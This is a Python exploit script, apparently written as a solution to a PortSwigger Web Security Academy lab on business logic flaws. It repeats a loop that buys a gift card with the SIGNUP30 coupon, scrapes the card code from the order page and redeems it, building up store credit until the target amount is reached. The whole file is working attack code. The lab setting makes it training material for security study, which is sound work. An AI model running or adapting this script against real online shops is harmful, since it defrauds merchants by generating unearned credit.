#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup
from threading import Thread
import re
import argparse

def sendRequests(url, cookie, csrfToken):
    buyGiftCardData = {
        'productId': '2',
        'redir': 'PRODUCT',
        'quantity': 1
    }

    applyCouponData = {
        'csrf': csrfToken,
        'coupon': 'SIGNUP30'
    }

    placeOrderData = {
        'csrf': csrfToken
    }

    # Buy a gift card
    requests.post(url + '/cart', cookies=cookie, data=buyGiftCardData)

    # Apply SIGNUP30 coupon
    requests.post(url + '/cart/coupon', cookies=cookie, data=applyCouponData)

    # Place order and fetch gift card code
    orderText = requests.post(url + '/cart/checkout', cookies=cookie, data=placeOrderData, allow_redirects=True).text

    # Extract the value of gift card code
    soup = BeautifulSoup(orderText, 'html.parser')
    # Find all <td> tags
    tableTd = soup.find_all('td')
    for td in tableTd:
        # The length of the code is always 10 characters long
        if len(td.text.strip()) == 10:
            # Extract the value of the code
            giftCardCode = td.text.strip()

    redeemGiftCardData = {
        'csrf': csrfToken,
        'gift-card': giftCardCode
    }

    # Redeem gift card
    requests.post(url + '/gift-card', cookies=cookie, data=redeemGiftCardData)

    # Check store credit
    myaccountText = requests.get(url + '/my-account', cookies=cookie).text
    soup = BeautifulSoup(myaccountText, 'html.parser')
    # Find <strong> tag
    strongTag = soup.find('strong')
    # Find pattern 123.00
    storeCredit = float(re.search(r'([0-9]+\.[0-9]{2})', strongTag.text).group(0))

    if storeCredit >= 935.90:
        print('[+] You now can buy the leather jacket WITH the SIGNUP30 coupon.')
        print(f'[+] Store credit: ${str(storeCredit)}')
        exit()
    else:
        # \r to clean previous line
        print(f'[*] Current store credit: ${str(storeCredit)}', end='\r')

def main():
    # Argument parser
    parser = argparse.ArgumentParser(description='Exploit infinite money logic flaw in PortSwigger business logic vulnerabilities lab.')
    parser.add_argument('-u', '--url', metavar='URL', required=True, help='Full URL of the lab. E.g: https://0aec00c0042979c2813957bd00c300bb.web-security-academy.net')
    parser.add_argument('-c', '--cookie', metavar='Cookie', required=True, help='Session cookie of your user wiener. E.g: Efi6qVmgThhBsbkiTeugTPMQQ2DtofbC')
    parser.add_argument('-t', '--token', metavar='CSRF_Token', required=True, help='CSRF token. E.g: yVr8Bdqr24wuRU6e6IjZCkdgEhfY3s3c')
    args = parser.parse_args()

    url = args.url
    cookie = {'session': args.cookie}
    csrfToken = args.token

    while True:
        # Create each thread to run function sendRequests(url, cookie, csrfToken)
        thread = Thread(target=sendRequests, args=(url, cookie, csrfToken))
        # Start the thread
        thread.start()
        # Wait for previous thread finish
        thread.join()

if __name__ == '__main__':
    main()
